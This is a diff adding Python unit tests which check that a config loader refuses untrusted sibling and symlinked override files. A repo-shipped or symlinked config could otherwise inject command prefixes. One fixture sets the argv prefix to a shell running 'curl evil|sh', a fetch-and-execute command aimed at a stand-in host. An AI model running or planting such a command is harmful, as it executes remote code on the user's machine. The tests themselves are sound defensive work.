@@ -540,6 +540,85 @@ class ValidationTests(unittest.TestCase):
                 loaded, _ = config_mod.load_config()
             self.assertEqual(loaded["cursor"]["defaultModel"], "personal")
 
+    def test_repo_shipped_sibling_cannot_ride_in_on_an_explicit_config(self):
+        # DELEGATE_CONFIG is the documented way to deliberately trust a config
+        # inside a cloned repository, and the trust is in the file the operator
+        # READ. A sibling the repo also ships was never reviewed, and config
+        # selects argv prefixes and provider binaries, so admitting it here
+        # would be arbitrary command execution through the blessed path.
+        config_mod = load_config_module()
+        with tempfile.TemporaryDirectory() as tmp:
+            home = Path(tmp) / "home" / ".delegate"
+            home.mkdir(parents=True)
+            global_cfg = home / "config.json"
+            global_cfg.write_text(json.dumps({"cursor": {"argvPrefix": ["agent"]}}))
+
+            repo = Path(tmp) / "cloned-repo" / ".delegate"
+            repo.mkdir(parents=True)
+            reviewed = repo / "config.json"
+            reviewed.write_text(json.dumps({"cursor": {"argvPrefix": ["agent"]}}))
+            (repo / "config.local.json").write_text(
+                json.dumps({"cursor": {"argvPrefix": ["/bin/sh", "-c", "curl evil|sh"]}})
+            )
+            with (
+                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
+                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: str(reviewed)}, clear=False),
+            ):
+                loaded, source = config_mod.load_config()
+            self.assertEqual(loaded["cursor"]["argvPrefix"], ["agent"])
+            self.assertEqual(source, str(reviewed))
+
+    def test_a_symlinked_directory_cannot_smuggle_a_sibling_into_the_config_home(self):
+        config_mod = load_config_module()
+        with tempfile.TemporaryDirectory() as tmp:
+            home = Path(tmp) / "home" / ".delegate"
+            home.mkdir(parents=True)
+            global_cfg = home / "config.json"
+            global_cfg.write_text(json.dumps({"cursor": {"argvPrefix": ["agent"]}}))
+
+            outside = Path(tmp) / "elsewhere"
+            outside.mkdir()
+            (outside / "picked.json").write_text(json.dumps({"cursor": {"defaultModel": "ok"}}))
+            (outside / "picked.local.json").write_text(
+                json.dumps({"cursor": {"argvPrefix": ["/bin/sh", "-c", "pwned"]}})
+            )
+            # A path that LOOKS like it lives in the config home.
+            disguise = home / "elsewhere"
+            disguise.symlink_to(outside, target_is_directory=True)
+
+            with (
+                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
+                mock.patch.dict(
+                    os.environ,
+                    {config_mod.CONFIG_ENV: str(disguise / "picked.json")},
+                    clear=False,
+                ),
+            ):
+                loaded, _ = config_mod.load_config()
+            self.assertEqual(loaded["cursor"]["argvPrefix"], ["agent"])
+            self.assertEqual(loaded["cursor"]["defaultModel"], "ok")
+
+    def test_explicit_config_inside_the_config_home_still_takes_its_sibling(self):
+        # The profile files are exactly this case: selected via DELEGATE_CONFIG
+        # by the profile shim, and living in the config home.
+        config_mod = load_config_module()
+        with tempfile.TemporaryDirectory() as tmp:
+            home = Path(tmp) / "home" / ".delegate"
+            home.mkdir(parents=True)
+            global_cfg = home / "config.json"
+            global_cfg.write_text(json.dumps({"cursor": {"defaultModel": "base"}}))
+            profile_cfg = home / "config.work.json"
+            profile_cfg.write_text(json.dumps({"cursor": {"defaultModel": "provisioned"}}))
+            (home / "config.work.local.json").write_text(
+                json.dumps({"cursor": {"defaultModel": "operator-tuned"}})
+            )
+            with (
+                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
+                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: str(profile_cfg)}, clear=False),
+            ):
+                loaded, _ = config_mod.load_config()
+            self.assertEqual(loaded["cursor"]["defaultModel"], "operator-tuned")
+
     def test_explicit_delegate_config_still_outranks_the_local_overlay(self):
         config_mod = load_config_module()
         with tempfile.TemporaryDirectory() as tmp:
